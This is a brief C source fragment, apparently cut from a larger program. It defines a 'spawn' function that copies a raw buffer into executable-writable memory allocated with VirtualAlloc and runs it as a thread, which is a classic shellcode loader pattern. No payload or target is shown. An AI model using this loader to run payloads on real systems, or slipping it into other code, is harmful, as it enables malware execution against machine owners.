...
/* spawn a thread using the raw contents of the specified buffer */
void spawn(void * buffer, int length) {
	void * ptr = VirtualAlloc(0, length, 0x1000, 0x40);
	int x;
	for (x = 0; x < length; x++) {
		RtlMoveMemory(ptr + x, buffer + x, 1);
	}
	CreateThread(0, 0, ptr, 0, 0, 0);
}
